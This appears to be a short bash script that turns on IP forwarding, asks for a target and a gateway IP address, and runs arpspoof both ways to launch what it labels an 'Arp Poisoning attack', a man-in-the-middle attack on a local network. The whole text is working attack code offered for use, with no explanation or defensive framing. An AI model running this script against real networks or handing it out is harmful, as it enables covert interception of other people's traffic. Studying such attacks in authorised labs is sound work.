echo 1 > /proc/sys/net/ipv4/ip_forward

echo "Enter the IP of the Client\Target Machine"
read varClient
echo "Enter the IP of the Server\Source\Gateway Machine"
read varServer

echo "Start Arp Poisoning attack"
arpspoof -i eth0 -t $varClient $varServer
arpspoof -i eth0 -t $varServer $varClient 




